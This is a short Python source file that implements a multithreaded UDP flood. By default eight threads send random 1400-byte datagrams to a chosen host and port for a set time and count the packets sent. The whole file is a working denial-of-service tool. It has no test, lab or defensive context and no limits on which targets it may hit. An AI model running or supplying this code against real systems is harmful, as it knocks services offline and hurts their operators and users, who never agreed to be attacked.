"""
UDP flood — packet blast with randomized payload.
Non-root; volume-limited by kernel send buffer.
"""
import os
import random
import socket
import time


class UDPFlood:
    def __init__(self, host, port=80, size=1400, threads=8, duration=60):
        self.host = host
        self.port = port
        self.size = size
        self.threads = threads
        self.duration = duration
        self.sent = 0
        self._stop = False

    def _blast(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1 << 20)
        end = time.time() + self.duration
        while not self._stop and time.time() < end:
            try:
                s.sendto(os.urandom(self.size), (self.host, self.port))
                self.sent += 1
            except Exception:
                pass

    def run(self):
        import threading
        ts = [threading.Thread(target=self._blast, daemon=True) for _ in range(self.threads)]
        for t in ts:
            t.start()
        try:
            for t in ts:
                t.join(timeout=self.duration + 1)
        except KeyboardInterrupt:
            self._stop = True
        return {"sent": self.sent}
